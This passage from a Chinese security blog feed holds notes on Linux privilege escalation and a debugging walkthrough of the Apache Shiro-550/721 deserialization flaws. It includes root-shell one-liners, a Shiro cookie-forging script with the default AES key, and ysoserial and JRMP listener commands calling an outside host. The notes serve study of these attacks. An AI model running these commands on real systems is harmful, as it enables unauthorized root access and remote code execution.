bypass</h2><p>直接用cp把/usr/bin里的命令复制过来就行了</p><h2 id="直接更改PATH-SHELL变量"><a href="#直接更改PATH-SHELL变量" class="headerlink" title="直接更改PATH/SHELL变量"></a>直接更改PATH/SHELL变量</h2><p>键入export -p 查看该用户的变量</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145455.png" alt="QQ截图20210217145455"></p><p>如果这俩变量有w权，那么我们可以直接写入来bypass</p><h2 id="ssh-bypass"><a href="#ssh-bypass" class="headerlink" title="ssh bypass"></a>ssh bypass</h2><p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh username@Ip -t &quot;&#x2F;bin&#x2F;bash&quot;</span><br></pre></td></tr></table></figure><h1 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h1><p>用 uanme -a 查明内核版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210311220036263.png" alt="image-20210311220036263"></p><p>然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解</p><h1 id="passwd和shadow"><a href="#passwd和shadow" class="headerlink" title="passwd和shadow"></a>passwd和shadow</h1><h2 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h2><p>/etc/passwd 默认所有用户可读，但只有root可写。<br>/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。</p><p>但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了</p><h2 id="passwd-可写"><a href="#passwd-可写" class="headerlink" title="passwd 可写"></a>passwd 可写</h2><p>如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的</p><h2 id="爆破shadow"><a href="#爆破shadow" class="headerlink" title="爆破shadow"></a>爆破shadow</h2><p>如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件</p><h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><h2 id="文件重写"><a href="#文件重写" class="headerlink" title="文件重写"></a>文件重写</h2><p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;cron*</span><br></pre></td></tr></table></figure><p>如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权</p><h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><p>我们查看定时任务</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316125520822.png" alt="image-20210316125520822"></p><p>发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17 *    * * *   root    shell.sh</span><br></pre></td></tr></table></figure><p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p><p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权</p><h2 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h2><p><a href="https://www.secpulse.com/archives/72965.html">https://www.secpulse.com/archives/72965.html</a> 总结的太好了，我都不想记笔记了（偷懒</p><h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。</p><p>这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限，</p><p>我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。</p><p>可能有点小绕，看下面具体操作就行了。</p><p>实验室配置:</p><p>首先在一个目录下创建如下文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim demo.c</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312183454821.png" alt="image-20210312183454821"></p><p>然后 gcc demo.c -o shell    将其编译为可执行文件</p><p>然后 chmod u+s shell           为其增加suid权限</p><p>攻击者视角:</p><p>首先使用下列指令搜寻suid权限文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" alt="image-20210312184402084"></p><p>发现可疑目标，执行一下看看</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" alt="image-20210312184424019"></p><p>发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system(“ps”);  这条c语言代码。<br>遂可尝试环境变量提权</p><p>我们依次执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">export $PATH&#x3D;&#x2F;tmp:$PATH        需要修改自身环境变量的权限，但基本上都有这个权限</span><br><span class="line">chmod 777 .&#x2F;ps                 没这条命令会导致提权失败</span><br><span class="line">cd &#x2F;home&#x2F;const27</span><br><span class="line">.&#x2F;shell                        提权成功</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184905534.png" alt="image-20210312184905534"></p><h1 id="密码查找"><a href="#密码查找" class="headerlink" title="密码查找"></a>密码查找</h1><p>这个提权技术说白了，就是去到处翻密码</p><h2 id="文件内查找"><a href="#文件内查找" class="headerlink" title="文件内查找"></a>文件内查找</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep --color&#x3D;auto -rnw &#39;&#x2F;&#39; -ie &quot;PASSWORD&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; &#x2F;dev&#x2F;null \;</span><br></pre></td></tr></table></figure><p>我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。</p><h2 id="查找十分钟内更改过的文件"><a href="#查找十分钟内更改过的文件" class="headerlink" title="查找十分钟内更改过的文件"></a>查找十分钟内更改过的文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -mmin -10 2&gt;&#x2F;dev&#x2F;null | grep -Ev &quot;^&#x2F;proc&quot;  (不显示^&#x2F;proc文件或文件夹)</span><br></pre></td></tr></table></figure><h1 id="capabilities"><a href="#capabilities" class="headerlink" title="capabilities"></a>capabilities</h1><p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>capabilities 把root的权限细分了，可以分别启用或者禁用。</p><p>在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。</p><p>如下是一些常见的特权操作及其对应capabilities </p><table><thead><tr><th>改变文件的所属者(chown())</th><th align="left">CAP_CHOWN</th></tr></thead><tbody><tr><td>向进程发送信号(kill(), signal())</td><td align="left">CAP_KILL</td></tr><tr><td>改变进程的uid(setuid(), setreuid(), setresuid()等)</td><td align="left">CAP_SETUID</td></tr><tr><td>trace进程(ptrace())</td><td align="left">CAP_SYS_PTRACE</td></tr><tr><td>设置系统时间(settimeofday(), stime()等)</td><td align="left">CAP_SYS_TIME</td></tr><tr><td>忽略文件读及目录搜索的DAC访问限制</td><td align="left">CAP_DAC_READ_SEARCH</td></tr></tbody></table><p>关于capabilities的管理工具有如下:</p><ul><li>getcap</li><li>setcap</li><li>capsh</li><li>filecap</li></ul><p>getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。</p><p>我们可以通过以下指令搜索设置了capabilities的可执行文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="通过cap-setuid"><a href="#通过cap-setuid" class="headerlink" title="通过cap_setuid"></a>通过cap_setuid</h3><p>cap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。</p><p>以python为例</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316201948608.png" alt="image-20210316201948608"></p><p>我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316202912697.png" alt="image-20210316202912697"></p><p>类似的有很多。</p><p>perl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure><p>gdb</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &quot;posix_setuid(0); system(&#39;&#x2F;bin&#x2F;sh&#39;);&quot;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p>rvim</p><p>需要支持python3模块。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rvim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p>vim</p><p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</span><br></pre></td></tr></table></figure><h3 id="通过CAP-DAC-READ-SEARCH"><a href="#通过CAP-DAC-READ-SEARCH" class="headerlink" title="通过CAP_DAC_READ_SEARCH"></a>通过CAP_DAC_READ_SEARCH</h3><p>cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。</p><p>利用此特性我们可以读取系统中的敏感信息。</p><p>如果tar有此权限，我们可以通过此来查看敏感文件内容。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf shadow.tar &#x2F;etc&#x2F;shadow  &#x2F;&#x2F;创建压缩文件</span><br><span class="line"></span><br><span class="line">tar -xvf shadow.tar  &#x2F;&#x2F;解压缩</span><br><span class="line"></span><br><span class="line">cd etc  &#x2F;&#x2F;进入解压缩的目录</span><br><span class="line"></span><br><span class="line">chmod +r shadow  &#x2F;&#x2F;赋予读权限</span><br><span class="line"></span><br><span class="line">cat shadow | grep root  &#x2F;&#x2F;查看shadow文件的内容</span><br></pre></td></tr></table></figure><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="Docker用户组提权"><a href="#Docker用户组提权" class="headerlink" title="Docker用户组提权"></a>Docker用户组提权</h2><p>如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权</p><p>首先我们执行如下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it crf_web1 chroot &#x2F;mnt sh</span><br></pre></td></tr></table></figure><p>然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316205908273.png" alt="image-20210316205908273"></p><p>然后退出来，直接尝试 su root2</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316210009057.png" alt="image-20210316210009057"></p><p>提权成功</p><h1 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h1><p>NFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题</p><h2 id="no-root-squash"><a href="#no-root-squash" class="headerlink" title="no_root_squash"></a>no_root_squash</h2><p>我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p><p>也就是说，任何机器的root在此目录上都有最高权限。</p><p>我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;nfs</span><br><span class="line">mount -o rw,vers&#x3D;3 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs 将本机上的&#x2F;tmp&#x2F;nfs 挂载到共享目录</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;nfs&#x2F;bash</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;nfs&#x2F;bash  设置共享目录上bash的suid</span><br></pre></td></tr></table></figure><p>回到低权限机，执行 /tmp/bash  完成提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sudo-和-suid-提权&quot;&gt;&lt;a href=&quot;#sudo-和-suid-提权&quot; class=&quot;headerlink&quot; title=&quot;sudo 和 suid 提权&quot;&gt;&lt;/a&gt;sudo 和 suid 提权&lt;/h1&gt;&lt;h2 id=&quot;何为suid&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化(shiro-550与shiro-721)</title>
    <link href="http://const27.com/2021/03/12/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://const27.com/2021/03/12/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-03-12T06:33:07.978Z</published>
    <updated>2021-03-10T14:44:19.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h1><p>Apache shiro 是java的一个安全框架，可以帮助完成认证，授权，加密，会话管理等功能。它不跟任何框架或容器绑定，可以独立运行。</p><h1 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>当shiro版本小于1.2.5时，主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>git clone <a href="https://github.com/apache/shiro.git">https://github.com/apache/shiro.git</a> 下载shiro</p><p>然后 git checkout shiro-root-1.2.4,切换到1.2.4版本进行对应版本的漏洞调试</p><p>编辑shiro/samples/web/pom.xml文件，在此处加入 <version>1.2</version> </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309141612431.png" alt="image-20210309141612431"></p><p>然后idea打开shiro/samples/web 下的pom.xml,然后Run -&gt; Edit Configurations 添加TomcatServer</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309142858354.png" alt="image-20210309142858354"></p><p>待idea加载完maven后，向tomcat部署工件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309143500761.png" alt="image-20210309143500761"></p><p>出现以下页面则说明环境搭建成功</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210309143605131.png" alt="image-20210309143605131"></p><h2 id="开始动调"><a href="#开始动调" class="headerlink" title="开始动调"></a>开始动调</h2><h3 id="序列化，加密"><a href="#序列化，加密" class="headerlink" title="序列化，加密"></a>序列化，加密</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 处下断点<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144449196.png" alt="image-20210309144449196"></p><p>然后进入shiro登陆页面，勾选<em>rememberme</em>，进行登录，断点命中</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144539506.png" alt="image-20210309144539506"></p><p>然后会校验token里面的rememberme是否为true，若为true则执行rememberIdentity函数</p><p>我们跟进rememberIdentity函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145259149.png" alt="image-20210309145259149"></p><p>发现principals变量获取了需要remember的用户名（此处为root），然后再调用重载函数rememberIdentity。<br>这个函数调用了convertPrincipalsToBytes,我们跟进看看这个函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145901675.png" alt="image-20210309145901675"></p><p>可以发现对传入的principals调用了serialize方法，继续跟进serialize方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150019544.png" alt="image-20210309150019544"></p><p>继续跟进serialize会来到这个地方</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150133277.png" alt="image-20210309150133277"></p><p>发现就是对其调用了writeObject()这个原生反序列方法而已，没什么好康的，转回头去看看convertPrincipalsToBytes那个加密函数encrypt</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309152804516.png" alt="image-20210309152804516"></p><p>发现通过getCipherService方法返回了一个东西，发现是加密方式等东西</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309153312468.png" alt="image-20210309153312468"></p><p>在此处156行会调用另一个encrypt方法，其中第一个参数是序列化后的用户名，第二个参数则是密钥（这个密钥是硬编码写入文件的，所以造成了安全问题）我们跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309154512813.png" alt="image-20210309154512813"></p><p>这里的ivBytes是一个随机生成的iv（我没跟进细看),然后在这个方法最后它调用了encrypt的重载函数，并传入了序列化后的用户名，key，iv，以及一个true。我们继续跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155203309.png" alt="image-20210309155203309"></p><p>可以发现通过arraycopy，把iv和加密后的密文数据（aes）放入了output,最后返回了output. 然后这个return会一直返回到此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155606194.png" alt="image-20210309155606194"></p><p>output的内容作为参数传入了rememberSerializedIdentity，跟进该函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155736406.png" alt="image-20210309155736406"></p><p>56行，把base64加密后的output作为值写入到cookie中的remembername键</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162524164.png" alt="image-20210309162524164"></p><p>57行将其返回给客户端</p><p>burp抓包发现事实确实如此</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162406182.png" alt="image-20210309162406182"></p><p>另外说一下那个硬编码key，那个硬编码的key在AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTES里</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309163021784.png" alt="image-20210309163021784"></p><p>可以发现通过getEncryptionCipherKey获得的key确实是DEFAULT_CIPHER_KEY_BYTES</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309164110278.png" alt="image-20210309164110278"></p><p>我们简要的梳理一下这个流程， 当我们勾选rememberme后，用户名会被序列化处理，然后与硬编码的key，随机生成的iv一起进行加密，然后以 iv+密文 的base64编码返回给用户的键为rememberme的cookie里。</p><h3 id="反序列化，解密"><a href="#反序列化，解密" class="headerlink" title="反序列化，解密"></a>反序列化，解密</h3><p>在我们勾选rememberme登陆后，刷新，抓包，将其JSESSIONID删除，使shiro验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213036364.png" alt="image-20210309213036364"></p><p>在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 打下断点，放包，断点命中。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213222271.png" alt="image-20210309213222271"></p><p>跟进getRememberedPrincipals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213255317.png" alt="image-20210309213255317"></p><p>随后再跟进getRememberedSerializedIdentity</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213345511.png" alt="image-20210309213345511"></p><p>关注这里的86行，此处的意思是从cookie中获得base64编码后的cookie值，随后在90行对其进行填充（CBC加密中的一个流程），95行进行base64解码，并将其返回</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214329614.png" alt="image-20210309214329614"></p><p>随后我们回到getRememberedPrincipals方法，跟进其convertBytesToPrincipals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214559031.png" alt="image-20210309214559031"></p><p>发现其中有个decrypt方法，这里的decrypt方法就是对其行aes解密，取前十六位为IV。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214846036.png" alt="image-20210309214846036"></p><p>下面140行则是对其进行反序列化处理了。我们跟进一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214941029.png" alt="image-20210309214941029"></p><p>再次跟进deserialize方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309215227753.png" alt="image-20210309215227753"></p><p>看到readObject,就意味着反序列化流程结束了。</p><p>梳理一下，cookie中remenber值传入后先base64解码，然后aes解密，然后反序列化。</p><h3 id="解密，重写cookie，以写入payload"><a href="#解密，重写cookie，以写入payload" class="headerlink" title="解密，重写cookie，以写入payload"></a>解密，重写cookie，以写入payload</h3><p>既然key是固定的，我们知道了key是什么，同时在CBC解密的时候，IV的作用只是作为第一个区块去解密第二个区块（生成的结果去解密第三个区块，以此类推），所以IV可以为随机值没什么特别要求（只要能解密就行了）那么我们就可以自己伪造一个cookie。</p><p>python脚本如下(嫖的笑师傅的)，序列化payload用base64格式传入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">mode &#x3D;  AES.MODE_CBC</span><br><span class="line">IV   &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span class="line">payload&#x3D;base64.b64decode(sys.argv[1])</span><br><span class="line">BS   &#x3D; AES.block_size</span><br><span class="line">pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">payload&#x3D;pad(payload)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure><p>然后我们只需要传入base64编码的，去除换行符的payload即可。</p><p>像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><h4 id="密钥获取"><a href="#密钥获取" class="headerlink" title="密钥获取"></a>密钥获取</h4><p>有些时候key并不是一成不变的kPH+bIxk5D2deZiIxcaaaA==，而有可能是其他值，我们可以用工具<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a> 来爆破出密钥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 </span><br></pre></td></tr></table></figure><p>即可开始爆破，当然这个工具的作用不仅仅如此</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310132845771.png" alt="image-20210310132845771"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>这个链其实根本没啥危害..只是拿来测试一下有没有洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>生成payload，像cookie伪造脚本传入，获得伪造的cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115008147.png" alt="image-20210310115008147"></p><p>rememberme登陆后，刷新抓包，删除cookie中的session，替换cookie中的rememberme为伪造后的cookie。放包,DNSLOG有反应</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115425170.png" alt="image-20210310115425170"></p><h3 id="cc链"><a href="#cc链" class="headerlink" title="cc链"></a>cc链</h3><h5 id="cc链2"><a href="#cc链2" class="headerlink" title="cc链2"></a>cc链2</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>然后制作cookie，发过去，成功弹计算器</p><h5 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h5><p>通过运行mvn dependency:list 命令可以发现当前Commons Collections 的版本是3.2.1</p><p>按理说会有cc链5，但是实际上用ysoserial 生成payload用上面的方法打过去后没有反应。看别人博客发现是这个原因 “Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。” 解决这种问题的办法是用JRMP</p><p>vps上执行以下命令，监听端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 &#39;calc&#39;</span><br></pre></td></tr></table></figure><p>我们再通过ysoserial生成payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;vps_ip:12006&#39;|base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>然后伪造cookie，发过去，成功弹计算器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310194746492.png" alt="image-20210310194746492"></p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>这个洞因为cookie中的值使用硬编码的key加密而成，我们可以以此来伪造cookie，顺便在cookie里写入危险的paylaod如cc链payload，使cookie中的值被解密，随后经历反序列化，造成命令执行</p><p>参考：<a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a> 笑师傅大大</p><h1 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h1><p>去年学的Padding Oracle 在此处被利用了起来。可以先看看Padding Oracle Attack 大概是个啥<a href="https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/">https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/</a></p><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.2.5, </span><br><span class="line">1.2.6, </span><br><span class="line">1.3.0, </span><br><span class="line">1.3.1, </span><br><span class="line">1.3.2, </span><br><span class="line">1.4.0-RC2, </span><br><span class="line">1.4.0, </span><br><span class="line">1.4.1</span><br></pre></td></tr></table></figure><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>其实漏洞代码层面逻辑上和shiro-550大致相似，只不过key没有硬编码进代码中了。<br>但是只要我们获得一个rememberme用户的cookie后就可以通过padding oracle attack 伪造任意cookie发过去了，从而造成反序列化漏洞了</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在这里下载1.4.1的war包<a 